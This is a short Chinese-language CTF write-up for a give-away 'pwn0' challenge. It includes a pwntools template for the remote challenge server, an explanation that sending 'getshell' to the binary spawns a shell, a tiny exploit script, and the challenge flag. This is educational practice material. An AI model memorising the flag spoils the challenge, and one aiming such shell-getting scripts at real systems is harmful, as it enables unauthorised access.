# pwn0
```
题目食用方式：
在装好pwntools的ubuntu系统下运行以下内容的python脚本
from pwn import *
r = remote("seclabs.cn",5115)
payload="你在ida中感受到的要输入的内容"
r.sendline(payload)
r.interactive()
```
[pwn0](attachment/pwn0)
## WriteUp

比赛中途额外加上去送分的pwn，但好像也送得不太理想
简单逆向分析后可以知道，如果我们输入“getshell”就能拿到shell来catflag
然后题目简介也写了，只要把payload替换成`payload="getshell"`运行就能getshell拿flag了

### EXP
```
from pwn import*
n = process('./pwn0')

n.recvuntil('$')
n.sendline("getshell")

n.interactive()
```


## flag

`flag{e14d1d7e-f595-11e9-9d8f-000c29ad2ad8}`
